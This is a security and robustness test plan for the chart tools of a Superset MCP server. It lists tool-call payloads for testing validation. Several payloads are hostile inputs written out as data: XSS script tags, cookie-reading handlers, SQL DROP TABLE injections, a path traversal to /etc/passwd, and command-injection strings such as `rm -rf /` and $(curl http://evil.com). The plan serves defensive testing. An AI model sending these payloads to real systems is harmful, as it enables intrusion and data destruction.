# MCP Chart Tools Stress Test Plan

This comprehensive test plan is designed to systematically break the MCP service chart tools by exploring edge cases, validation boundaries, and potential failure modes. Execute these tests in Claude Desktop to uncover weaknesses in validation, error handling, and security.

## Test Execution Instructions

1. **Environment Setup**: Ensure Superset is running and accessible
2. **Test Order**: Execute tests in the order presented for maximum coverage
3. **Error Collection**: Document all error messages and unexpected behaviors
4. **Security Focus**: Pay special attention to any security bypass scenarios

## 1. SQL Injection & XSS Attack Tests

### 1.1 Script Injection in Column Names
```json
# Test Case: XSS in column name
mcp__mcp-server__generate_chart {
  "request": {
    "dataset_id": 1,
    "config": {
      "chart_type": "table",
      "columns": [
        {"name": "<script>alert('XSS')</script>", "label": "Malicious Column"},
        {"name": "sales'; DROP TABLE users; --", "aggregate": "SUM"}
      ]
    }
  }
}

# Test Case: Script tag variations
mcp__mcp-server__generate_chart {
  "request": {
    "dataset_id": 1,
    "config": {
      "chart_type": "xy",
      "x": {"name": "<img src=x onerror=alert('XSS')>"},
      "y": [{"name": "revenue<script>fetch('http://evil.com')</script>", "aggregate": "SUM"}]
    }
  }
}
```

### 1.2 SQL Injection in Filter Values
```json
# Test Case: SQL injection in filter conditions
mcp__mcp-server__generate_chart {
  "request": {
    "dataset_id": 1,
    "config": {
      "chart_type": "table",
      "columns": [{"name": "product"}],
      "filters": [
        {"column": "category", "op": "=", "value": "'; DROP TABLE charts; --"},
        {"column": "status", "op": "=", "value": "1' OR '1'='1"}
      ]
    }
  }
}

# Test Case: Command injection attempts
mcp__mcp-server__generate_chart {
  "request": {
    "dataset_id": 1,
    "config": {
      "chart_type": "xy",
      "x": {"name": "date"},
      "y": [{"name": "sales", "aggregate": "SUM"}],
      "filters": [
        {"column": "region", "op": "=", "value": "`rm -rf /`"},
        {"column": "type", "op": "=", "value": "$(curl http://evil.com)"}
      ]
    }
  }
}
```

### 1.3 Label Injection Tests
```json
# Test Case: XSS in custom labels
mcp__mcp-server__generate_chart {
  "request": {
    "dataset_id": 1,
    "config": {
      "chart_type": "table",
      "columns": [
        {"name": "product", "label": "<iframe src='javascript:alert(1)'></iframe>"},
        {"name": "sales", "label": "Sales<svg onload=alert(document.cookie)>", "aggregate": "SUM"}
      ]
    }
  }
}
```

## 2. Boundary & Extreme Value Tests

### 2.1 String Length Limits
```json
# Test Case: Extremely long column names
mcp__mcp-server__generate_chart {
  "request": {
    "dataset_id": 1,
    "config": {
      "chart_type": "table",
      "columns": [
        {"name": "a".repeat(10000), "label": "Long Column"},
        {"name": "🔥".repeat(5000), "label": "Unicode Spam"}
      ]
    }
  }
}

# Test Case: Extremely long filter values
mcp__mcp-server__generate_chart {
  "request": {
    "dataset_id": 1,
    "config": {
      "chart_type": "xy",
      "x": {"name": "date"},
      "y": [{"name": "sales", "aggregate": "SUM"}],
      "filters": [
        {"column": "description", "op": "=", "value": "x".repeat(1000000)}
      ]
    }
  }
}
```

### 2.2 Numeric Extremes
```json
# Test Case: Extreme cache timeout values
mcp__mcp-server__generate_chart {
  "request": {
    "dataset_id": 1,
    "config": {"chart_type": "table", "columns": [{"name": "test"}]},
    "cache_timeout": -999999999
  }
}

# Test Case: Max integer overflow
mcp__mcp-server__generate_chart {
  "request": {
    "dataset_id": 1,
    "config": {"chart_type": "table", "columns": [{"name": "test"}]},
    "cache_timeout": 9007199254740992
  }
}

# Test Case: Float where integer expected
mcp__mcp-server__generate_chart {
  "request": {
    "dataset_id": "1.5",
    "config": {"chart_type": "table", "columns": [{"name": "test"}]},
    "cache_timeout": 3.14159
  }
}
```

### 2.3 Array Size Limits
```json
# Test Case: Thousands of columns
mcp__mcp-server__generate_chart {
  "request": {
    "dataset_id": 1,
    "config": {
      "chart_type": "table",
      "columns": Array(10000).fill(null).map((_, i) => ({
        "name": `column_${i}`,
        "aggregate": i % 2 === 0 ? "SUM" : "COUNT"
      }))
    }
  }
}

# Test Case: Massive filter array
mcp__mcp-server__generate_chart {
  "request": {
    "dataset_id": 1,
    "config": {
      "chart_type": "xy",
      "x": {"name": "date"},
      "y": [{"name": "sales", "aggregate": "SUM"}],
      "filters": Array(1000).fill(null).map((_, i) => ({
        "column": "status",
        "op": "=",
        "value": `value_${i}`
      }))
    }
  }
}
```

## 3. Invalid Data Type Tests

### 3.1 Type Confusion
```json
# Test Case: Object where string expected
mcp__mcp-server__generate_chart {
  "request": {
    "dataset_id": {"id": 1, "hack": "attempt"},
    "config": {
      "chart_type": "table",
      "columns": [{"name": {"column": "sales"}, "aggregate": "SUM"}]
    }
  }
}

# Test Case: Array where object expected
mcp__mcp-server__generate_chart {
  "request": {
    "dataset_id": 1,
    "config": {
      "chart_type": "xy",
      "x": ["date", "time"],
      "y": {"name": "sales", "aggregate": "SUM"}
    }
  }
}

# Test Case: Null in required fields
mcp__mcp-server__generate_chart {
  "request": {
    "dataset_id": null,
    "config": {
      "chart_type": "table",
      "columns": [{"name": null, "aggregate": null}]
    }
  }
}
```

### 3.2 Invalid Enum Values
```json
# Test Case: Invalid chart type
mcp__mcp-server__generate_chart {
  "request": {
    "dataset_id": 1,
    "config": {
      "chart_type": "3d_hologram",
      "columns": [{"name": "test"}]
    }
  }
}

# Test Case: Invalid aggregation functions
mcp__mcp-server__generate_chart {
  "request": {
    "dataset_id": 1,
    "config": {
      "chart_type": "table",
      "columns": [
        {"name": "sales", "aggregate": "CUSTOM_FUNCTION"},
        {"name": "profit", "aggregate": "HACK()"},
        {"name": "cost", "aggregate": "'; DROP TABLE; --"}
      ]
    }
  }
}

# Test Case: Invalid filter operators
mcp__mcp-server__generate_chart {
  "request": {
    "dataset_id": 1,
    "config": {
      "chart_type": "table",
      "columns": [{"name": "product"}],
      "filters": [
        {"column": "price", "op": "BETWEEN", "value": "100 AND 200"},
        {"column": "status", "op": "~=", "value": "active"},
        {"column": "date", "op": "><", "value": "2024"}
      ]
    }
  }
}
```

## 4. Empty & Edge Case Data

### 4.1 Empty Arrays and Strings
```json
# Test Case: Empty column array
mcp__mcp-server__generate_chart {
  "request": {
    "dataset_id": 1,
    "config": {
      "chart_type": "table",
      "columns": []
    }
  }
}

# Test Case: Empty Y-axis for XY chart
mcp__mcp-server__generate_chart {
  "request": {
    "dataset_id": 1,
    "config": {
      "chart_type": "xy",
      "x": {"name": "date"},
      "y": []
    }
  }
}

# Test Case: Empty string column names
mcp__mcp-server__generate_chart {
  "request": {
    "dataset_id": 1,
    "config": {
      "chart_type": "table",
      "columns": [
        {"name": "", "label": "Empty Name"},
        {"name": "   ", "label": "Whitespace Only"},
        {"name": "\n\t\r", "label": "Control Characters"}
      ]
    }
  }
}
```

### 4.2 Duplicate Labels
```json
# Test Case: Duplicate column labels in table
mcp__mcp-server__generate_chart {
  "request": {
    "dataset_id": 1,
    "config": {
      "chart_type": "table",
      "columns": [
        {"name": "sales", "label": "Revenue"},
        {"name": "profit", "label": "Revenue"},
        {"name": "cost", "label": "Revenue"}
      ]
    }
  }
}

# Test Case: XY chart with conflicting labels
mcp__mcp-server__generate_chart {
  "request": {
    "dataset_id": 1,
    "config": {
      "chart_type": "xy",
      "x": {"name": "date", "label": "Metric"},
      "y": [
        {"name": "sales", "label": "Metric"},
        {"name": "profit", "label": "Metric"}
      ],
      "group_by": {"name": "region", "label": "Metric"}
    }
  }
}
```

## 5. Unicode & Special Characters

### 5.1 Unicode Stress Tests
```json
# Test Case: Unicode in all fields
mcp__mcp-server__generate_chart {
  "request": {
    "dataset_id": 1,
    "config": {
      "chart_type": "table",
      "columns": [
        {"name": "🔥💰📊", "label": "火炎データ"},
        {"name": "sales", "label": "مبيعات", "aggregate": "SUM"},
        {"name": "profit", "label": "利润", "aggregate": "AVG"}
      ],
      "filters": [
        {"column": "region", "op": "=", "value": "北京市🏙️"},
        {"column": "status", "op": "!=", "value": "❌INACTIVE❌"}
      ]
    }
  }
}

# Test Case: RTL text and special Unicode blocks
mcp__mcp-server__generate_chart {
  "request": {
    "dataset_id": 1,
    "config": {
      "chart_type": "xy",
      "x": {"name": "תאריך", "label": "‏תאריך‏"},
      "y": [{"name": "مجموع", "aggregate": "SUM", "label": "المجموع الكلي"}]
    }
  }
}
```

### 5.2 Control Characters
```json
# Test Case: Zero-width and control characters
mcp__mcp-server__generate_chart {
  "request": {
    "dataset_id": 1,
    "config": {
      "chart_type": "table",
      "columns": [
        {"name": "sales\u200B", "label": "Invisible\u200CSpace\u200D"},
        {"name": "profit\u0000", "label": "Null\u0001Byte"},
        {"name": "cost\u202E", "label": "RTL\u202DOverride"}
      ]
    }
  }
}
```

## 6. Performance Stress Tests

### 6.1 Complex Nested Structures
```json
# Test Case: Deeply nested axis configurations
mcp__mcp-server__generate_chart {
  "request": {
    "dataset_id": 1,
    "config": {
      "chart_type": "xy",
      "x": {"name": "date"},
      "y": [{"name": "sales", "aggregate": "SUM"}],
      "x_axis": {
        "title": "Date Range",
        "scale": "linear",
        "format": "${'$'}'.repeat(1000) + '.2f"
      },
      "y_axis": {
        "title": "A".repeat(10000),
        "scale": "log",
        "format": ",.".repeat(500) + "2f"
      },
      "legend": {
        "show": true,
        "position": "right"
      }
    }
  }
}
```

### 6.2 Concurrent Request Simulation
```json
# Execute these simultaneously to test race conditions
# Request 1
mcp__mcp-server__generate_chart {
  "request": {
    "dataset_id": 1,
    "config": {"chart_type": "table", "columns": [{"name": "test1"}]},
    "save_chart": false
  }
}

# Request 2 (immediate after)
mcp__mcp-server__update_chart_preview {
  "request": {
    "form_data_key": "[KEY_FROM_REQUEST_1]",
    "dataset_id": 1,
    "config": {"chart_type": "xy", "x": {"name": "date"}, "y": [{"name": "sales"}]}
  }
}
```

## 7. Invalid Dataset & Permission Tests

### 7.1 Non-existent Datasets
```json
# Test Case: Invalid dataset IDs
mcp__mcp-server__generate_chart {
  "request": {
    "dataset_id": 999999999,
    "config": {"chart_type": "table", "columns": [{"name": "test"}]}
  }
}

# Test Case: Malformed UUIDs
mcp__mcp-server__generate_chart {
  "request": {
    "dataset_id": "not-a-uuid-at-all",
    "config": {"chart_type": "table", "columns": [{"name": "test"}]}
  }
}

# Test Case: SQL injection in dataset ID
mcp__mcp-server__generate_chart {
  "request": {
    "dataset_id": "1'; DROP TABLE datasets; --",
    "config": {"chart_type": "table", "columns": [{"name": "test"}]}
  }
}
```

### 7.2 Column Validation Bypass
```json
# Test Case: Non-existent columns with fuzzy matching
mcp__mcp-server__generate_chart {
  "request": {
    "dataset_id": 1,
    "config": {
      "chart_type": "table",
      "columns": [
        {"name": "definitely_not_a_real_column"},
        {"name": "sales_typo_test", "aggregate": "SUM"},
        {"name": "SALES", "aggregate": "AVG"}  # Case sensitivity test
      ]
    }
  }
}
```

## 8. Chart Update Edge Cases

### 8.1 Update Non-existent Charts
```json
# Test Case: Update with invalid chart ID
mcp__mcp-server__update_chart {
  "request": {
    "identifier": 999999999,
    "config": {"chart_type": "table", "columns": [{"name": "test"}]}
  }
}

# Test Case: Update with malicious chart name
mcp__mcp-server__update_chart {
  "request": {
    "identifier": 1,
    "chart_name": "<script>alert('Updated!')</script>",
    "config": {"chart_type": "table", "columns": [{"name": "test"}]}
  }
}
```

### 8.2 Preview Manipulation
```json
# Test Case: Invalid form_data_key
mcp__mcp-server__update_chart_preview {
  "request": {
    "form_data_key": "../../etc/passwd",
    "dataset_id": 1,
    "config": {"chart_type": "table", "columns": [{"name": "test"}]}
  }
}

# Test Case: Cache poisoning attempt
mcp__mcp-server__update_chart_preview {
  "request": {
    "form_data_key": "valid_key",
    "dataset_id": 1,
    "config": {"chart_type": "table", "columns": [{"name": "test"}]},
    "cache_form_data": false,
    "force_refresh": true,
    "use_cache": false
  }
}
```

## 9. Complex Filter Combinations

### 9.1 Contradictory Filters
```json
# Test Case: Impossible filter conditions
mcp__mcp-server__generate_chart {
  "request": {
    "dataset_id": 1,
    "config": {
      "chart_type": "table",
      "columns": [{"name": "product"}],
      "filters": [
        {"column": "price", "op": ">", "value": 1000},
        {"column": "price", "op": "<", "value": 100},
        {"column": "status", "op": "=", "value": "active"},
        {"column": "status", "op": "!=", "value": "active"}
      ]
    }
  }
}
```

### 9.2 Type Mismatch Filters
```json
# Test Case: String operators on numeric columns
mcp__mcp-server__generate_chart {
  "request": {
    "dataset_id": 1,
    "config": {
      "chart_type": "xy",
      "x": {"name": "date"},
      "y": [{"name": "sales", "aggregate": "SUM"}],
      "filters": [
        {"column": "price", "op": "=", "value": "not a number"},
        {"column": "date", "op": ">", "value": "yesterday"},
        {"column": "count", "op": "=", "value": true}
      ]
    }
  }
}
```

## 10. Aggregate Function Abuse

### 10.1 Invalid Aggregate Combinations
```json
# Test Case: Text column with numeric aggregates
mcp__mcp-server__generate_chart {
  "request": {
    "dataset_id": 1,
    "config": {
      "chart_type": "table",
      "columns": [
        {"name": "product_name", "aggregate": "SUM"},
        {"name": "description", "aggregate": "AVG"},
        {"name": "category", "aggregate": "STDDEV"}
      ]
    }
  }
}

# Test Case: Custom SQL in aggregate
mcp__mcp-server__generate_chart {
  "request": {
    "dataset_id": 1,
    "config": {
      "chart_type": "xy",
      "x": {"name": "date"},
      "y": [
        {"name": "sales", "aggregate": "SUM(sales) * 2"},
        {"name": "profit", "aggregate": "COUNT(*) FROM users"},
        {"name": "cost", "aggregate": "MAX(1/0)"}
      ]
    }
  }
}
```

## 11. Dashboard Integration Stress

### 11.1 Invalid Dashboard Operations
```json
# Test Case: Add non-existent chart to dashboard
mcp__mcp-server__add_chart_to_existing_dashboard {
  "request": {
    "dashboard_id": 1,
    "chart_id": 999999999
  }
}

# Test Case: Invalid dashboard ID
mcp__mcp-server__add_chart_to_existing_dashboard {
  "request": {
    "dashboard_id": -1,
    "chart_id": 1,
    "target_tab": "<script>alert('tab')</script>"
  }
}
```

## 12. Preview Format Edge Cases

### 12.1 Invalid Preview Requests
```json
# Test Case: All preview formats simultaneously
mcp__mcp-server__get_chart_preview {
  "request": {
    "identifier": 1,
    "format": "url",
    "width": -100,
    "height": 999999999,
    "ascii_width": 0,
    "ascii_height": -50
  }
}

# Test Case: Invalid format type
mcp__mcp-server__generate_chart {
  "request": {
    "dataset_id": 1,
    "config": {"chart_type": "table", "columns": [{"name": "test"}]},
    "preview_formats": ["url", "hologram", "telepathy", "base64"]
  }
}
```

## Expected Failure Modes

1. **Security Failures**: XSS/SQL injection attempts should be sanitized or rejected
2. **Validation Failures**: Invalid data types should produce clear error messages
3. **Performance Failures**: Large data should timeout or be rejected
4. **Logic Failures**: Contradictory configurations should be caught
5. **Schema Failures**: Missing required fields should have helpful error messages

## Success Criteria

- All security attacks are properly sanitized or rejected
- Error messages are helpful and don't expose internal details
- System remains stable under stress conditions
- No data corruption or persistent side effects
- Clear distinction between user errors and system errors

## Post-Test Cleanup

After running these tests:
1. Check for any created charts that weren't cleaned up
2. Verify cache integrity
3. Review logs for any unhandled exceptions
4. Confirm system performance returns to normal
